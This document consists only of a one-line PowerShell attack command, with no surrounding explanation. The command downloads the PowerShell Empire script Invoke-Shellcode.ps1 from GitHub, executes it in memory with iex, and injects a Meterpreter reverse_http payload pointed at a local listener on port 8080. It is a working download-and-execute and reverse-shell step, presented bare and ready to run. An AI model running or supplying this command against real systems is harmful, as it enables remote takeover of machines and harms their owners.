
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1"); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 127.0.0.1 -Lport 8080 -Force

